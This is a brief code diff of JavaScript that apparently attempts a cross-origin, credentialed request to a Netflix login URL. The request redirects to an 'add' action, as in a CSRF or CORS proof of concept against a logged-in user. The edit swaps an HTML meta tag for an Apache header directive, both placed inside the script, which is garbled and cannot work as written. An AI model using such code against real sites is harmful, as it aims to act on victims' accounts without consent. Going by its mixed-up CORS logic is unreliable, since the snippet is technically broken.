@@ -4,7 +4,7 @@ var req = new XMLHttpRequest();
 req.onload = reqListener;
 req.open('get','https://www.netflix.com/login?nextpage=https://www.netflix.com/add/8148335',true);
 req.withCredentials = true;
-<meta http-equiv="Access-Control-Allow-Origin" content="*" />
+Header set Access-Control-Allow-Origin *
 req.send(null);
 
 function reqListener() {
